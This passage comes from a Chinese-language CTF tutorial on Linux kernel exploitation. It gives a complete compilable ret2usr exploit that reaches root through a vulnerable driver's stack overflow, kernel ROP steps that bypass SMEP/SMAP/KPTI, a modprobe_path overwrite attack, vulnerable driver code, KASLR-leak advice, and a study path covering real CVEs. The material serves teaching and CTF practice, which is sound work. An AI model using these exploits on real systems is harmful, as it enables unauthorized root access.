1. `file rootfs.cpio` → 解包（`cpio -idmv`），读 init：`insmod /vuln.ko`、设备 `/dev/vuln`、shell 为 uid 1000、flag 为 root 400。
2. `./extract-vmlinux bzImage > vmlinux`，`readelf -s vmlinux | grep -E "prepare_kernel_cred|commit_creds|swapgs_restore"` 记下三个地址（nokaslr → 静态即运行）。
3. `objdump -d vuln.ko` 确认 write 路径无 canary、无长度检查；数清 `kernel_buf` 到保存的返回地址的偏移（本例 0x40）。
4. 按 12.6 模板一写 exp（write 触发，无需 ioctl）。
5. `gcc -static -o exp`，塞进 rootfs 重打包（12.2.2），`boot.py` 启动。

**完整 exp（可直接编译）：**

```c
// ex1_exp.c —— babyret2usr 完整解题 exp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

typedef unsigned long ulong;
ulong user_cs, user_ss, user_rflags, user_rsp;

void save_state(void)
{
    __asm__ __volatile__(
        "movq %%cs, %0\n" "movq %%ss, %1\n"
        "pushfq\n" "popq %2\n" "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        : : "memory");
}

/* 步骤 2 里从 vmlinux 查到的三个地址 */
ulong pkc_addr = 0xffffffff8109cde0UL;      // prepare_kernel_cred
ulong cc_addr  = 0xffffffff8109c8e0UL;      // commit_creds
ulong tramp    = 0xffffffff81800e70UL;      // swapgs_restore_regs_and_return_to_usermode+22

void escalate(void)                          // CPL=0 下执行：换 root cred
{
    ulong (*pkc)(int)  = (ulong (*)(int))pkc_addr;
    void  (*cc)(ulong) = (void  (*)(ulong))cc_addr;
    cc(pkc(0));
}

void get_shell(void)                         // 回到用户态：已是 root
{
    if (getuid() == 0) system("/bin/sh");
    else { puts("[-] not root"); exit(1); }
}

int main(void)
{
    save_state();
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    ulong payload[64];
    memset(payload, 0x41, sizeof(payload));  // 0x40 缓冲区 + 保存寄存器区全填掉
    int i = 8;                               // buf 本体 0x40 = 8 个 qword
    payload[i++] = (ulong)escalate;          // 返回地址 → ret2usr
    payload[i++] = tramp;                    // escalate ret 后 → trampoline
    payload[i++] = 0;  payload[i++] = 0;     // 占位×2
    payload[i++] = (ulong)get_shell;         // iretq 五元组
    payload[i++] = user_cs;
    payload[i++] = user_rflags;
    payload[i++] = user_rsp;
    payload[i++] = user_ss;

    write(fd, payload, sizeof(payload));     // 触发：len 未验 → 内核栈溢出
    puts("[-] failed");
    return 0;
}
```

**预期运行效果：**

```
/ $ /home/exp
[+] PWN! uid=0
/ # id
uid=0(root) gid=0(root)
/ # cat /flag
flag{ret2usr_is_the_best_tutorial}
```

### 例题 2：开 SMEP/SMAP/KPTI 的内核 ROP（smep-rop）

**start.sh：**

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -append "console=ttyS0 nokaslr pti=on" \
    -cpu kvm64,+smep,+smap \
    -nographic \
    -no-reboot
```

判读：`nokaslr`（gadget/符号地址固定）；`+smep,+smap` 且 append 无 nosmep/nosmap → **SMEP/SMAP 开**；`pti=on` 强制 → **KPTI 开**。结论：ret2usr 死路，走 12.6 模板二（内核 ROP + KPTI trampoline）。

**漏洞驱动关键代码（这次走 ioctl）：**

```c
struct req { size_t len; char __user *data; };   // 用户态传进来的请求

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    char buf[0x40];                              // 内核栈缓冲区
    struct req r;
    if (cmd != 0x7777) return -EINVAL;
    copy_from_user(&r, (void __user *)arg, sizeof(r));
    copy_from_user(buf, r.data, r.len);          // ← 漏洞：r.len 未验，内核栈溢出
    return 0;
}
```

**解题流程：**

1. 前两步同例题 1（解包、提取 vmlinux）。
2. **确认 trampoline 偏移**（KPTI 题的关键工序）：

```
gdb ./vmlinux
(gdb) disassemble swapgs_restore_regs_and_return_to_usermode
   ...一长串 pop...
   +22  ← 确认该偏移处恰好是"pop 结束、即将 swapgs/切页表"的入口
(gdb) x/5i swapgs_restore_regs_and_return_to_usermode+22
```

3. 找 gadget：`ROPgadget --binary vmlinux > gadgets.txt`，各取一个 `pop rdi; ret`、`mov rdi, rax; ret`。
4. 按 12.6 模板二写 exp，触发改为 ioctl：

```c
struct req r = { .len = sizeof(payload), .data = (char *)payload };
ioctl(fd, 0x7777, &r);           // 驱动 copy_from_user(buf, r.data, r.len) → 溢出
```

   （SMAP 不影响此路径：驱动读用户数据走的是 copy_from_user，内部 stac 合法放行。）

5. 打包运行。若 panic 在 escalate 相关地址 → 说明 trampoline 偏移选错或五元组错位，回到第 2 步核对。

**预期运行效果：**

```
/ $ /home/exp
[+] PWN! root shell:
/ # cat /flag
flag{kernel_rop_with_kpti_trampoline}
```

### 例题 3：modprobe_path 数据攻击（modprobe-easy）

**start.sh：**

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M -kernel ./bzImage -initrd ./rootfs.cpio \
    -append "console=ttyS0 nokaslr" -cpu qemu64 \
    -nographic -no-reboot
```

**漏洞驱动关键代码（OOB 下标 → 任意读写，12.4.4 的模式三）：**

```c
static long data[0x100];                         // 驱动全局数组（.bss）

struct request { long idx; long val; long __user *buf; };

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    struct request r;
    copy_from_user(&r, (void __user *)arg, sizeof(r));
    switch (cmd) {
    case 0x100: copy_to_user(r.buf, &data[r.idx], 8); break;   // idx 未查 → 任意读
    case 0x101: data[r.idx] = r.val;               break;     // idx 未查 → 任意写
    }
    return 0;
}
```

**解题流程：**

1. 解包、提取 vmlinux；这题连 ROP 都不需要——只需要两个符号：`data`（驱动全局数组，`readelf -s` 或 insmod 后 `/proc/kallsyms` 查）和 `modprobe_path`。
2. 按 12.6 模板三写 exp：`idx = (目标地址 - data地址)/8` 完成地址换算。
3. 准备 `/tmp/x`（root 脚本）与 `/tmp/dummy`（非法魔数触发器），覆写 `modprobe_path`，执行触发。
4. 全程不碰控制流，KPTI/SMAP 与本解法无关——这正是数据攻击路线的价值。

**完整 exp**：见 12.5.7（即 12.6 模板三），仅需按本题把 `CMD_READ/CMD_WRITE` 换成 `0x100/0x101` 并填上 `data`、`modprobe_path` 的真实地址。

**预期运行效果：**

```
/ $ /home/exp
[*] old modprobe_path = 0x646f6d2f6e696273   （"/sbin/modprobe" 的字节）
[*] new modprobe_path = 0x782f706d742f       （"/tmp/x"）
/ $ cat /tmp/flag
flag{data_only_attack_no_rip_control}
```

> **KASLR 进阶提示**：三道例题都故意 nokaslr。真实题目开 KASLR 时，先用泄露原语拿内核基址：任意读可读内核里已知的函数指针（如驱动 fops 表项、内核栈残留返回地址）算出偏移；拿不到泄露就考虑侧信道或 dmesg/kallsyms 配置疏漏（12.3.1）。本地先把 exploit 在 nokaslr 下调通，再补"泄露→重定位所有地址"一步，是标准工作流。

---

## 12.8 学习路径建议

**从哪找题（由易到难）：**

| 资源 | 说明 |
|:--|:--|
| CTF Wiki 内核 PWN 章节 | 理论 + 例题，与本章互补 |
| GitHub: bsauce/kernel-exploit-factory | CTF 内核题大合集，按 CVE/比赛归类，带 exp，刷题首选 |
| GitHub: xairy/linux-kernel-exploitation | 真实内核漏洞利用论文/exp 合集（进阶理论库） |
| pwn.college（ASU） | 有系统化的 kernel 模块练习环境，英文但质量高 |
| 经典赛题 | CISCN 2017 babydriver（UAF 入门第一题）、hxp CTF kernel-rop（SMEP+KPTI ROP 教科书）、0CTF 2018 babykernel |

**进阶方向（按推荐顺序）：**

1. **SLUB 堆风水**：kmalloc 缓存的布局控制、堆喷原语（setxattr / msg_msg / add_key / sk_buff / pipe_buffer）——从"碰运气"到"可复现"的必经之路。
2. **msg_msg / pipe_buffer 系列**：这两类对象的布局与利用是近年内核 CTF 的主力载体（任意读/写构造、页级堆风水 cross-cache）。
3. **竞争条件进阶**：userfaultfd / FUSE 制造确定性窗口，配 Epoll/IO 事件竞态。
4. **1-day 复现**：挑带公开分析文章的 CVE 复现是性价比最高的成长方式，推荐梯度：CVE-2017-11176（消息队列 UAF，教科书级）→ DirtyPipe（CVE-2022-0847）→ DirtyCred（凭证替换通用思路）→ msg_msg 相关 CVE（CVE-2021-22555 等）。
5. **新子系统**：io_uring、netfilter、eBPF 验证器——近年真题热点，每个都是"子系统 + 对象管理"的独立世界。
6. **缓解措施攻防**：KASLR 侧信道（EntryBLEED 等）、CONFIG_CFI 场景下的数据流攻击。

---

## 12.9 常见坑

| 坑 | 现象 | 解法 |
|:--|:--|:--|
| **本地/远程 qemu 版本差异** | 本地必崩/必成，远程相反；`+smap` 参数报错 | 对齐版本或 CPU 型号；开 `-cpu` 时注意特性命名差异；别用太老的 qemu 调 KPTI 题 |
| **没加 nokaslr，地址全随机** | exp 用 vmlinux 静态地址 → 一触发就 oops | 本地调试一律先加 `nokaslr`；远程开 KASLR 时必须先泄露再重定位全部地址（12.3.1/12.7） |
| **gdb 断不下来** | `b vuln_ioctl` 报 "Function not defined"，或断点永不命中 | ① 用的是 bzImage 不是 vmlinux；② 模块符号没挂：先 `b do_init_module` 再 `add-symbol-file vuln.ko <地址>`；③ 地址算错（忘加 KASLR 偏移） |
| **cpio 重打包后 init 没执行权限** | 开机 "Failed to execute /init" 直接 panic | 打包前 `chmod +x init`（以及所有改过的脚本）；检查属主（`--owner=root:root`） |
| **模块编译内核版本不匹配** | `insmod` 报 "Invalid module format"，dmesg 显示 vermagic 不符 | 用与题目 bzImage 完全一致版本的内核源码/headers 编译；或改内核源码顶层 Makefile 的 EXTRAVERSION 对齐；只分析不改驱动时不必重编 |
| **exp 没静态链接 / 体积爆炸** | 虚拟机里跑不起来（缺 libc）；initramfs 塞不下 | `gcc -static`；`strip`；或 musl-gcc；或 gzip+base64 运行时解出 |
| **panic 后 exp 的 pwntools 交互挂死** | `-no-reboot` 下 qemu 直接退出，`io.interactive()` 卡住 | pwntools 里捕获 EOF 正常；把"拿 flag"动作全部做进 exploit/触发脚本，别依赖事后手动 |
| **竞争条件题本地单核不复现** | `-smp 1` 时窗口极小，成功率诡异 | 用 `-smp 2` 以上贴近远程；或上 userfaultfd/FUSE 把窗口变成确定事件 |
| **oops 看不懂** | dmesg 一屏寄存器 dump | 先看 `RIP: ... [<模块+偏移>]` 定位出错指令，`objdump -d vuln.ko` 对照；`Call Trace` 看调用路径；`(gdb) x/10i <RIP>` 配 vmlinux 最直观 |

---

## 12.10 本章检查清单

出门自查，全勾才算入门毕业：

- [ ] 能说出题目包里 bzImage / rootfs.cpio / start.sh / *.ko 各自的作用
- [ ] 能独立完成 initramfs 的解包、改 init、塞 exp、重打包（含 chmod +x init）
- [ ] 会用 extract-vmlinux / vmlinux-to-elf 从 bzImage 得到可分析的 vmlinux
- [ ] 会用 `qemu -s -S` + gdb 调内核，会给模块 add-symbol-file 并在驱动函数上下断
- [ ] 看一眼 start.sh 就能判断 KASLR/SMEP/SMAP/KPTI 的开关，并能说出各自挡住了什么打法
- [ ] 能手写 save_state，说清 iretq 五元组的顺序和 swapgs 的作用
- [ ] 能默写三模板的 payload 布局：ret2usr / 内核 ROP（含 KPTI trampoline 的"占位×2+五元组"）/ modprobe_path 流程
- [ ] 知道新内核要用 commit_creds(&init_cred) 替代 prepare_kernel_cred(0)
- [ ] 完成了至少一道真实赛题（推荐 CISCN babydriver 或 hxp kernel-rop）
- [ ] 明白数据攻击（modprobe_path/core_pattern）与控制流劫持两条路线的适用条件

---

## 相关阅读

- [01-基础知识与工具链](01-基础知识与工具链.md) —— 环境与工具的通用底座（gdb、pwntools 基本功在内核调试中同样天天用）
- [05-ret2libc](05-ret2libc.md) —— "泄露基址 → 重定位 → 借库函数"的思想在内核即"泄露 KASLR → 用内核符号"
- [07-ROP高级技巧](07-ROP高级技巧.md) —— gadget 搜寻、栈迁移、链式构造的通用方法论，内核 ROP 完全是同一套手艺
